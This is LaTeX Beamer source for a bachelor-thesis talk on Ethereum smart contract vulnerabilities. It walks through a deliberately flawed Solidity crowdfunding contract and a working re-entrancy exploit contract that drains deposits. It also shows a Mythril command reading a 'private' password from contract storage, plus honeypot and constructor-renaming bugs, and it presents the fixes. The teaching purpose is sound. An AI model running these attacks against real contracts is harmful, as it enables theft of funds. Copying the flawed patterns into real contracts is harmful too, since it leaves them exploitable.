\documentclass[xcolor=x11names,compress]{beamer}
\usepackage{graphicx}
\usepackage{palatino}
\usepackage{adjustbox}
\usepackage{minted}
\usemintedstyle{paraiso-dark}

\makeatletter
\let\beamer@writeslidentry@miniframeson=\beamer@writeslidentry
\def\beamer@writeslidentry@miniframesoff{%
  \expandafter\beamer@ifempty\expandafter{\beamer@framestartpage}{}% does not happen normally
  {
    \clearpage\beamer@notesactions%
  }
}
\newcommand*{\miniframeson}{\let\beamer@writeslidentry=\beamer@writeslidentry@miniframeson}
\newcommand*{\miniframesoff}{\let\beamer@writeslidentry=\beamer@writeslidentry@miniframesoff}
\makeatother

\usetheme{Antibes}
\setbeamertemplate{navigation symbols}{}
\usefonttheme{serif}

% BEAMER THEME
\useoutertheme[subsection=false,shadow]{miniframes}
\useinnertheme{default}

\setbeamerfont{title like}{shape=\scshape}
\setbeamerfont{frametitle}{shape=\scshape}

\setbeamercolor{background canvas}{bg=black}
\setbeamercolor*{alerted text}{fg=red} 
\setbeamercolor*{example text}{fg=white} 
\setbeamercolor*{structure}{fg=white} 
\setbeamercolor*{normal text}{fg=white,bg=black}
\setbeamercolor*{title}{fg=white}
\setbeamercolor*{frametitle}{fg=white}

\setbeamercolor*{palette tertiary}{fg=white}
\setbeamercolor*{palette quaternary}{fg=white} 

\color{white}
% END BEAMER THEME

\title{Vulnerabilities of Smart Contracts}
\subtitle{bachelor thesis}
\author{Konstantin Fickel}
\date{18th of July 2018}

\begin{document}
\begin{frame}[plain]
\end{frame}

\begin{frame}
	\begin{center}
		\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/crowdfunding/01.pdf}
	\end{center}
\end{frame}

\begin{frame}[plain]
	\begin{center}
		
\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/cover.pdf}
	\end{center}
\end{frame}

\section{Blockchain}
\begin{frame}
	\frametitle{State}
	\begin{center}
		\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/state/01.pdf}
	\end{center}
\end{frame}

\begin{frame}
	\frametitle{Transactions}
	\begin{overprint}
		\onslide<1>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/state/02.pdf}
		\end{center}
		\onslide<2>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/state/03.pdf}
		\end{center}
		\onslide<3>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/state/04.pdf}
		\end{center}
	\end{overprint}
\end{frame}

\begin{frame}
	\frametitle{Blocks}
	\begin{overprint}
		\onslide<1>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/block/01.pdf}
		\end{center}
		\onslide<2>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/block/02.pdf}
		\end{center}
	\end{overprint}
\end{frame}

\begin{frame}
	\frametitle{Mining \& Consensus}

	\begin{overprint}
		\onslide<1>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/mining/short/01.pdf}
		\end{center}
		\onslide<2>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/mining/short/02.pdf}
		\end{center}
		\onslide<3>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/mining/short/03.pdf}
		\end{center}
	\end{overprint}
\end{frame}

\begin{frame}
	\frametitle{Smart Contracts}

	\begin{overprint}
		\onslide<1>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/state/02.pdf}
		\end{center}
		\onslide<2>\begin{center}
			
\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/state/07.pdf}
		\end{center}
		\onslide<3>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/state/05.pdf}
		\end{center}
		\onslide<4>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/state/06.pdf}
		\end{center}
		\onslide<5>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/state/08.pdf}
		\end{center}
		\onslide<6>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/state/09.pdf}
		\end{center}
	\end{overprint}
\end{frame}

\section{Ethereum}
\begin{frame}
	\frametitle{Ethereum Blockchain}
	\begin{center}
		
\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/ethereum/logo.pdf}
	\end{center}
\end{frame}

\begin{frame}
	\frametitle{Ethereum Virtual Machine}
	\begin{overprint}
		\onslide<1>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/stackmachine/01.pdf}
		\end{center}
		\onslide<2>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/stackmachine/02.pdf}
		\end{center}
		\onslide<3>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/stackmachine/03.pdf}
		\end{center}
		\onslide<4>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/stackmachine/04.pdf}
		\end{center}
		\onslide<5>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/stackmachine/05.pdf}
		\end{center}
		\onslide<6>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/stackmachine/06.pdf}
		\end{center}
		\onslide<7>\begin{center}
			
\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/stackmachine/07.pdf}
		\end{center}
		\onslide<8>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/stackmachine/08.pdf}
		\end{center}
		\onslide<9>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/stackmachine/09.pdf}
		\end{center}
		\onslide<10>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/stackmachine/10.pdf}
		\end{center}
		\onslide<11>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/stackmachine/11.pdf}
		\end{center}
		\onslide<12>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/stackmachine/12.pdf}
		\end{center}
		\onslide<13>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/stackmachine/13.pdf}
		\end{center}
		\onslide<14>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/stackmachine/14.pdf}
		\end{center}
	\end{overprint}
\end{frame}

\bgroup
\begin{frame}[fragile]
	\frametitle{Solidity}
	\begin{overprint}
		\onslide<1>\begin{minipage}[c][0.7\textheight][c]{\textwidth}
			\setminted{fontsize=\fontsize{1cm}{1cm}\selectfont,baselinestretch=1}
			\begin{minted}{solidity}
counter++;
\end{minted}
		\end{minipage}
		\onslide<2>\begin{minipage}[c][0.7\textheight][c]{\textwidth}
			\setminted{fontsize=\fontsize{0.4cm}{0.4cm}\selectfont,baselinestretch=1}
			\begin{minted}{solidity}
pragma solidity ^0.4.23;

contract CallCounter {
    uint public counter;

    function countMe() public {
        counter++;
    }
}
\end{minted}
		\end{minipage}
		\onslide<3>\begin{minipage}[c][0.7\textheight][c]{\textwidth}
			\setminted{fontsize=\fontsize{0.5cm}{0.5cm}\selectfont,baselinestretch=1}
			\begin{minted}{solidity}
otherContract.call();
\end{minted}
		\end{minipage}
		\onslide<4>\begin{minipage}[c][0.7\textheight][c]{\textwidth}
			\setminted{fontsize=\fontsize{0.5cm}{0.5cm}\selectfont,baselinestretch=1}
			\begin{minted}{solidity}
otherContract.call.value(1 ether);
\end{minted}
		\end{minipage}
		\onslide<5>\begin{minipage}[c][0.7\textheight][c]{\textwidth}
			\setminted{fontsize=\fontsize{0.5cm}{0.5cm}\selectfont,baselinestretch=1}
			\begin{minted}{solidity}
otherContract.call.value(1 ether)();
\end{minted}
		\end{minipage}
	\end{overprint}
\end{frame}
\egroup

\section{Vulnerabilities}
\begin{frame}
	\begin{center}
		\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/crowdfunding/01.pdf}
	\end{center}
\end{frame}

\bgroup
\begin{frame}[fragile]
	\vspace{1cm}
	\begin{overprint}
		\onslide<1>\begin{minipage}[c][0.7\textheight][c]{\textwidth}
			\setminted{fontsize=\fontsize{0.15cm}{0.15cm}\selectfont,baselinestretch=1}
			\begin{minted}{solidity}
pragma solidity ^0.4.23;

contract CrowdFunding {
    enum State {
        FUNDING,
        FAILED,
        SUCCEEDED
    }
    State state = State.FUNDING;

    uint private password;

    uint minimal = 10 ether;
    uint endOfFundingPeriod = block.timestamp + 2 days;

    mapping(address => uint) deposit;
    
    function () public payable {
        deposit[msg.sender] += msg.value;
    }

    function CrowdFunding(uint _password) public {
        password = _password;
    }
    
    function updateState() public {
        require(state == State.FUNDING);
        require(block.timestamp >= endOfFundingPeriod);
        
        state = address(this).balance >= minimal
            ? State.SUCCEEDED
            : State.FAILED;
    }
    
    function finishFunding(uint _password) public {
        require(state == State.SUCCEEDED);
        require(password == _password);
        
        selfdestruct(msg.sender);
    }
    
    function withdrawDeposit() public {
        require(state == State.FAILED);
        require(deposit[msg.sender] != 0);
        
        msg.sender.call.value(deposit[msg.sender])();
        deposit[msg.sender] = 0;
    }
}
    \end{minted}
		\end{minipage}
		\onslide<2>\begin{minipage}[c][0.7\textheight][c]{\textwidth}
			\setminted{fontsize=\fontsize{0.3cm}{0.3cm}\selectfont,baselinestretch=1}
			\begin{minted}{solidity}
enum State {
    FUNDING,
    FAILED,
    SUCCEEDED
}
State state = State.FUNDING;

uint minimal = 10 ether;
uint endOfFundingPeriod = block.timestamp + 2 days;
    \end{minted}
		\end{minipage}

		\onslide<3>\begin{minipage}[c][0.7\textheight][c]{\textwidth}
			\setminted{fontsize=\fontsize{0.3cm}{0.3cm}\selectfont,baselinestretch=1}
			\begin{minted}{solidity}
uint private password;

mapping(address => uint) deposit;
    \end{minted}
		\end{minipage}
		\onslide<4>\begin{minipage}[c][0.7\textheight][c]{\textwidth}
			\setminted{fontsize=\fontsize{0.3cm}{0.3cm}\selectfont,baselinestretch=1}
			\begin{minted}{solidity}
function CrowdFunding(uint _password) public {
    password = _password;
}
	\end{minted}
		\end{minipage}

		\onslide<5>\begin{minipage}[c][0.7\textheight][c]{\textwidth}
			\setminted{fontsize=\fontsize{0.3cm}{0.3cm}\selectfont,baselinestretch=1}
			\begin{minted}{solidity}
function () public payable {
    deposit[msg.sender] += msg.value;
}
	\end{minted}
		\end{minipage}
		\onslide<6>\begin{minipage}[c][0.7\textheight][c]{\textwidth}
			\setminted{fontsize=\fontsize{0.3cm}{0.3cm}\selectfont,baselinestretch=1}
			\begin{minted}{solidity}
function updateState() public {
    require(state == State.FUNDING);
    require(block.timestamp >= endOfFundingPeriod);
    
    state = address(this).balance >= minimal
        ? State.SUCCEEDED
        : State.FAILED;
}
	\end{minted}
		\end{minipage}
		\onslide<7>\begin{minipage}[c][0.7\textheight][c]{\textwidth}
			\setminted{fontsize=\fontsize{0.3cm}{0.3cm}\selectfont,baselinestretch=1}
			\begin{minted}{solidity}
function finishFunding(uint _password) public {
    require(state == State.SUCCEEDED);
    require(password == _password);
    
    selfdestruct(msg.sender);
}
	\end{minted}
		\end{minipage}
		\onslide<8>\begin{minipage}[c][0.7\textheight][c]{\textwidth}
			\setminted{fontsize=\fontsize{0.3cm}{0.3cm}\selectfont,baselinestretch=1}
			\begin{minted}{solidity}
function withdrawDeposit() public {
    require(state == State.FAILED);
    require(deposit[msg.sender] != 0);
    
    msg.sender.call.value(deposit[msg.sender])();
    deposit[msg.sender] = 0;
}
	\end{minted}
		\end{minipage}
	\end{overprint}
\end{frame}
\egroup

\begin{frame}[fragile]
	\frametitle{Privacy on the blockchain}
	\begin{overprint}
		\onslide<1>\begin{minipage}[c][0.7\textheight][c]{\textwidth}
			\setminted{fontsize=\fontsize{0.25cm}{0.25cm}\selectfont,baselinestretch=1}
			\begin{minted}{solidity}
uint private password;

function CrowdFunding(uint _password) public {
    password = _password;
}

function finishFunding(uint _password) public {
    require(state == State.SUCCEEDED);
    require(password == _password);
    
    selfdestruct(msg.sender);
}
    \end{minted}
		\end{minipage}
		\onslide<2>\begin{minipage}[c][0.7\textheight][c]{\textwidth}
			\tiny
			\begin{verbatim}
$ myth --storage 1 -a "0xd798116970913332c2f9C062Efd8b7F0CD4a67CA"
1: 0x0000000000000000000000000000000000000000000000000000000000000539
			\end{verbatim}
		\end{minipage}
		\onslide<3>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/blockchainexplorers/02.pdf}
		\end{center}
		\onslide<4>\begin{minipage}[c][0.7\textheight][c]{\textwidth}
			\setminted{fontsize=\fontsize{0.25cm}{0.25cm}\selectfont,baselinestretch=1}
			\begin{minted}{solidity}
uint private password;

function CrowdFunding(uint _password) public {
    password = _password;
}

function finishFunding(uint _password) public {
    require(state == State.SUCCEEDED);
    require(password == _password);
    
    selfdestruct(msg.sender);
}
    \end{minted}
		\end{minipage}
		\onslide<5>\begin{minipage}[c][0.7\textheight][c]{\textwidth}
			\setminted{fontsize=\fontsize{0.25cm}{0.25cm}\selectfont,baselinestretch=1}
			\begin{minted}{solidity}
bytes32 private passwordHash;

function CrowdFunding(bytes32 _passwordHash) public {
    passwordHash = _passwordHash;
}

function finishFunding(uint _password) public {
    require(state == State.SUCCEEDED);
    require(passwordHash == keccak256(abi.encodePacked(_password)));
    
    selfdestruct(msg.sender);
}
    \end{minted}
		\end{minipage}
	\end{overprint}
\end{frame}

\begin{frame}[fragile]
	\frametitle{Re-entrancy}
	\begin{overprint}
		\onslide<1>\begin{minipage}[c][0.7\textheight][c]{\textwidth}
			\setminted{fontsize=\fontsize{0.3cm}{0.3cm}\selectfont,baselinestretch=1}
			\begin{minted}{solidity}
mapping(address => uint) deposit;

function withdrawDeposit() public {
    require(state == State.FAILED);
    require(deposit[msg.sender] != 0);
    
    msg.sender.call.value(deposit[msg.sender])();
    deposit[msg.sender] = 0;
}
\end{minted}
		\end{minipage}
		\onslide<2>\begin{minipage}[c][0.7\textheight][c]{\textwidth}
			\setminted{fontsize=\fontsize{0.25cm}{0.25cm}\selectfont,baselinestretch=1}
			\begin{minted}{solidity}
contract CrowdFundingExploit {
    address owner = msg.sender;

    function participate(CrowdFunding cf) payable public {
        cf.call.value(address(this).balance)();
    }
    
    function () public payable {
        if(gasleft() > 100000) {
            CrowdFunding(msg.sender).withdrawDeposit();
        }
    }
    
    function attack(CrowdFunding cf) public {
        cf.withdrawDeposit();
    } 
    
    function withdraw() public {
        owner.transfer(address(this).balance);
    }
}
    \end{minted}
		\end{minipage}
		\onslide<3>\begin{minipage}[c][0.7\textheight][c]{\textwidth}
			\setminted{fontsize=\fontsize{0.3cm}{0.3cm}\selectfont,baselinestretch=1}
			\begin{minted}{solidity}
function () public payable {
    if(gasleft() > 100000) {
        CrowdFunding(msg.sender).withdrawDeposit();
    }
}

function attack(CrowdFunding cf) public {
    cf.withdrawDeposit();
} 
    \end{minted}
		\end{minipage}
		\onslide<4>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/reentrancy/01.pdf}
		\end{center}
		\onslide<5>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/reentrancy/02.pdf}
		\end{center}
		\onslide<6>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/reentrancy/03.pdf}
		\end{center}
		\onslide<7>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/reentrancy/04.pdf}
		\end{center}
		\onslide<8>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/reentrancy/05.pdf}
		\end{center}
		\onslide<9>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/reentrancy/06.pdf}
		\end{center}
		\onslide<10>\begin{center}
			
\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/reentrancy/07.pdf}
		\end{center}
		\onslide<11>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/reentrancy/08.pdf}
		\end{center}
		\onslide<12>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/reentrancy/09.pdf}
		\end{center}
		\onslide<13>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/reentrancy/10.pdf}
		\end{center}
		\onslide<14>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/reentrancy/11.pdf}
		\end{center}
		\onslide<15>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/reentrancy/12.pdf}
		\end{center}
		\onslide<16>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/reentrancy/13.pdf}
		\end{center}
		\onslide<17>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/reentrancy/14.pdf}
		\end{center}
		\onslide<18>\begin{minipage}[c][0.7\textheight][c]{\textwidth}
			\setminted{fontsize=\fontsize{0.3cm}{0.3cm}\selectfont,baselinestretch=1}
			\begin{minted}{solidity}
mapping(address => uint) deposit;

function withdrawDeposit() public {
    require(state == State.FAILED);
    require(deposit[msg.sender] != 0);
    
    msg.sender.call.value(deposit[msg.sender])();
    deposit[msg.sender] = 0;
}
    \end{minted}
		\end{minipage}
		\onslide<19>\begin{minipage}[c][0.7\textheight][c]{\textwidth}
			\setminted{fontsize=\fontsize{0.3cm}{0.3cm}\selectfont,baselinestretch=1}
			\begin{minted}{solidity}
mapping(address => uint) deposit;

function withdrawDeposit() public {
    require(state == State.FAILED);
    require(deposit[msg.sender] != 0);
    
    uint amount = deposit[msg.sender];
    msg.sender.call.value(amount)();
    deposit[msg.sender] = 0;
}
    \end{minted}
		\end{minipage}
		\onslide<20>\begin{minipage}[c][0.7\textheight][c]{\textwidth}
			\setminted{fontsize=\fontsize{0.3cm}{0.3cm}\selectfont,baselinestretch=1}
			\begin{minted}{solidity}
mapping(address => uint) deposit;

function withdrawDeposit() public {
    require(state == State.FAILED);
    require(deposit[msg.sender] != 0);
    
    uint amount = deposit[msg.sender];
    deposit[msg.sender] = 0;
    msg.sender.call.value(amount)();
}
    \end{minted}
		\end{minipage}
		\onslide<21>\begin{center}
			\vspace{0.2cm}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/daohack/zeitonline.png}
		\end{center}
	\end{overprint}
\end{frame}

% Note that there is an additional vulnerability against "transaction races". If the value is withdrawn by the owner, an attacker could attempt to withrdraw the ether by copying the wihtdrawal transaction with a higher gas price.

\section{Honeypots}

\begin{frame}
	\begin{center}
		\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/blockchainexplorers/01.pdf}
	\end{center}
\end{frame}

\begin{frame}[fragile]
	\begin{minted}{solidity}
contract X2_FLASH  {
    address owner = msg.sender;
    
    function() public payable {}
    
    function X2() public payable {
        if(msg.value > 1 ether) {
            msg.sender.call.value(this.balance);
        }
    }
    
    function Kill() public payable {
        if(msg.sender==owner) {
            selfdestruct(owner);
        }
    }
}
\end{minted}
\end{frame}

\miniframesoff
\begin{frame}
\end{frame}

\begin{frame}[fragile]
	\frametitle{Constructors of renamed contracts}
	\begin{overprint}
		\onslide<1>\begin{minipage}[c][0.7\textheight][c]{\textwidth}
			\setminted{fontsize=\fontsize{0.3cm}{0.3cm}\selectfont,baselinestretch=1}
			\begin{minted}{solidity}
contract CrowdFunding {
    function CrowdFunding(bytes32 _passwordHash) public {
        password = _passwordHash;
    }
}
\end{minted}
		\end{minipage}
		\onslide<2>\begin{minipage}[c][0.7\textheight][c]{\textwidth}
			\setminted{fontsize=\fontsize{0.3cm}{0.3cm}\selectfont,baselinestretch=1}
			\begin{minted}{solidity}
contract SecureCrowdFunding {
    function CrowdFunding(bytes32 _passwordHash) public {
        password = _passwordHash;
    }
}
    \end{minted}
		\end{minipage}
		\onslide<3>\begin{minipage}[c][0.7\textheight][c]{\textwidth}
			\setminted{fontsize=\fontsize{0.3cm}{0.3cm}\selectfont,baselinestretch=1}
			\begin{minted}{solidity}
contract SecureCrowdFunding {
    constructor(bytes32 _passwordHash) public {
        password = _passwordHash;
    }
}
    \end{minted}
		\end{minipage}
	\end{overprint}
\end{frame}

\begin{frame}
\end{frame}

\begin{frame}
	\frametitle{Mining \& Consensus}

	\begin{overprint}
		\onslide<1>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/mining/01.pdf}
		\end{center}
		\onslide<2>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/mining/02.pdf}
		\end{center}
		\onslide<3>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/mining/03.pdf}
		\end{center}
		\onslide<4>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/mining/04.pdf}
		\end{center}
		\onslide<5>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/mining/05.pdf}
		\end{center}
		\onslide<6>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/mining/06.pdf}
		\end{center}
		\onslide<7>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/mining/07.pdf}
		\end{center}
		\onslide<8>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/mining/08.pdf}
		\end{center}
		\onslide<9>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/mining/09.pdf}
		\end{center}
		\onslide<10>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/mining/10.pdf}
		\end{center}
		\onslide<11>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/mining/11.pdf}
		\end{center}
		\onslide<12>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/mining/12.pdf}
		\end{center}
		\onslide<13>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/mining/13.pdf}
		\end{center}
		\onslide<14>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/mining/14.pdf}
		\end{center}
		\onslide<15>\begin{center}
			\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/mining/15.pdf}
		\end{center}
	\end{overprint}
\end{frame}

\begin{frame}
\end{frame}
\miniframeson

\end{document}
